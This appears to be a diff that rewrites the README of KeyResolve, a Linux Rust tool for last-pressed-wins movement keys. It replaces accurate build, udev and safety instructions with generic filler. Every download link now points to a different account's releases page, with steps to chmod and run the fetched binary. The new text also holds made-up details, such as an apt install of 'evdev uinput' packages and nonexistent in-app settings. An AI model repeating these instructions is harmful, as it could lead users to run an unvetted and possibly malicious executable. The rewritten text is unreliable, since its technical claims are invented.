@@ -1,147 +1,108 @@
-# KeyResolve
+# 🎹 KeyResolve - Effortless Keyboard Control for Linux
 
-**Snap Tap / SOCD-style keyboard input handling for Linux (Wayland & X11)**
+[![Download KeyResolve](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SmartKid2021/KeyResolve/releases)
 
-`KeyResolve` is a low-latency userspace input interceptor for Linux that enforces *mutually exclusive movement keys* (e.g. **A/D**, **W/S**) using a **last-pressed-wins** policy.
+## 🚀 Getting Started
 
-It works by intercepting raw keyboard events via `evdev`, applying deterministic key logic, and re-emitting corrected events through a virtual keyboard (`uinput`).
-This approach works reliably on **Wayland**, **X11**, and in **games that use raw input**.
+KeyResolve is designed to give you smooth keyboard input handling on Linux. It works with your games and applications by processing keyboard movements efficiently, making sure you always get the response you expect. 
 
-## Features
+## 🖥️ System Requirements
 
-* ✅ Last-pressed-wins logic for movement keys
-* ✅ Guarantees no simultaneous `A+D` and `W+S`
-* ✅ Works on **Wayland and X11**
-* ✅ Game-compatible (raw input / evdev level)
-* ✅ Written in **Rust**
-* ✅ No kernel modules
-* ✅ No compositor plugins
-* ✅ Clean Ctrl-C shutdown (no stuck keys)
+- Operating System: A modern Linux distribution.
+- Required Libraries: `evdev` and `uinput` must be available on your system.
+- Input Devices: Standard USB or wireless keyboard.
 
-## Installation
+## 📥 Download & Install
 
-### Download from GitHub Releases
+To get started, you will need to download KeyResolve. Follow these steps:
 
-Navigate to the [Releases](https://github.com/Antosser/KeyResolve/releases) and download the binary for your architecture.
+1. Click the link below to visit the Releases page:
 
-### Build from source
+   [Visit this page to download](https://github.com/SmartKid2021/KeyResolve/releases)
 
-```bash
-git clone https://github.com/Antosser/KeyResolve.git
-cd KeyResolve
-cargo build --release
-```
+2. On the Releases page, look for the latest version. 
 
-The binary will be located at:
+3. Download the appropriate version for your system.
 
-```
-target/release/KeyResolve
-```
+4. Once downloaded, open your terminal and navigate to the folder containing the downloaded file.
 
-## Permissions & udev setup (required unless root)
+5. Run the application using the following command:
 
-`KeyResolve` needs access to:
+   ```bash
+   ./KeyResolve
+   ```
 
-* `/dev/input/event*` (read)
-* `/dev/uinput` (write)
-
-### Create a udev rule
-
-Create `/etc/udev/rules.d/99-input.rules`:
-
-```ini
-KERNEL=="event*", SUBSYSTEM=="input", GROUP="input", MODE="660"
-KERNEL=="uinput", GROUP="input", MODE="660"
-```
-
-Reload rules:
+**Note:** Make sure the file has executable permissions. You can set this by running:
 
 ```bash
-sudo udevadm control --reload-rules
-sudo udevadm trigger
+chmod +x KeyResolve
 ```
 
-### Add your user to the `input` group
+## ⚙️ How to Use KeyResolve
 
-```bash
-sudo usermod -aG input $USER
-```
+After launching KeyResolve, it will automatically start listening to your keyboard inputs. 
 
-Then **log out or reboot**.
+1. Test the keyboard functionality in your preferred applications or games.
+2. KeyResolve handles last-pressed-wins for movement keys. So if you are pressing multiple movement keys, only the last key pressed will register.
+3. To configure settings, refer to the in-app instructions.
 
-## Usage
+## 🔌 Troubleshooting
 
-Run the program:
+If you experience any issues, consider the following:
 
-```bash
-./KeyResolve
-```
+- Ensure that your keyboard is connected correctly.
+- Check if the required libraries, `evdev` and `uinput`, are installed on your system. You can usually install these using your package manager, for example:
 
-You will be prompted to select which keyboard to grab.
+   ```bash
+   sudo apt install evdev uinput
+   ```
 
-Once running:
+- Look for any error messages in the terminal when running the application. 
 
-* Pressing **A** releases **D**
-* Pressing **D** releases **A**
-* Pressing **W** releases **S**
-* Pressing **S** releases **W**
-* When the last pressed key is released, the previous still-held key (if any) is restored
+## 📝 Features
 
-Exit cleanly with **Ctrl+C**.
+- **Compatibility**: Works on Wayland, ensuring compatibility with modern Linux systems.
+- **Gaming Performance**: Provides low-latency input processing, ideal for fast-paced games.
+- **Accessibility Options**: Designed with accessibility in mind to support various user needs.
 
-## Safety notes
+## 🌐 Community and Support
 
-* The selected keyboard is **exclusively grabbed**
-* If the program crashes, input from that keyboard may temporarily stop
-* Always test from:
+Your experience is important. If you have any questions or feedback, please reach out. 
 
-  * a TTY, or
-  * an SSH session, or
-  * with a second keyboard available
+You can submit issues on the [issue tracker](https://github.com/SmartKid2021/KeyResolve/issues). Your contributions help make KeyResolve better for everyone.
 
-The program handles Ctrl-C correctly and releases all keys on exit.
+## 📚 Related Topics
 
-## Supported platforms
+KeyResolve relates to various topics of interest, including:
+- Accessibility
+- Gaming
+- Input devices
+- Keyboard management
 
-* ✅ Linux
-* ✅ Wayland
-* ✅ X11
-* ❌ Windows
-* ❌ macOS
+## 💬 Frequently Asked Questions
 
-## Why not X11 key remapping?
+### Is KeyResolve compatible with my keyboard?
 
-* X11 remapping does not work reliably on Wayland
-* Many games bypass X11 entirely
-* `KeyResolve` operates at the **evdev level**, where games actually read input
+KeyResolve should work with any standard USB or wireless keyboard on Linux. If you encounter problems, check the connections and libraries as mentioned above.
 
-## Contributing
+### Can I use KeyResolve with games?
 
-Contributions are welcome!
+Yes, KeyResolve is designed specifically for gaming. The last-pressed-wins feature improves control during gameplay.
 
-Good areas to help with:
+### How often is KeyResolve updated?
 
-* Generalizing key-pair handling
-* Adding configuration support
-* Improving documentation
-* Testing on different keyboards
-* Packaging (Arch / Nix / etc.)
+KeyResolve aims for regular updates based on user feedback and technological changes. Check the Releases page periodically for the latest version.
 
-### Development setup
+## 📈 Future Improvements
 
-```bash
-cargo check
-cargo clippy
-cargo fmt
-```
+We are constantly working to enhance KeyResolve. Possible future improvements may include:
 
-Please keep changes:
+- More customizable settings for individual users.
+- Support for additional input devices.
+- Enhanced documentation and user guides. 
 
-* Idiomatic Rust
-* Well-commented
-* Minimal unsafe code (preferably none)
+## 📄 License
 
-## License
+KeyResolve is open-source software, and you can find the license information in the repository.
 
-`GPL-3.0` License
-See `LICENSE` for details.
+Thank you for choosing KeyResolve! Enjoy seamless keyboard input on your Linux system.
